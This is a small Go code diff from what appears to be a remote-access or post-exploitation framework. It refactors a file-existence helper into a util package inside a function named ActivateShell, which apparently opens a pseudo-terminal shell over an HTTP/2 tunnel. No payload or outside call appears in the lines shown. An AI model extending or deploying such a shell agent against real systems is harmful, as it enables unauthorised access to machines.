@@ -14,6 +14,7 @@ import (
 
 	"github.com/creack/pty"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
 )
 
@@ -34,7 +35,7 @@ func ActivateShell(token string) (err error) {
 	)
 
 	// check if we have utilities installed
-	if !IsFileExist(UtilsPath + "/bash") {
+	if !util.IsFileExist(UtilsPath + "/bash") {
 		err = errors.New("ActivateShell: can't find bash in utilities, try module `vaccine`?")
 		log.Print(err)
 		return
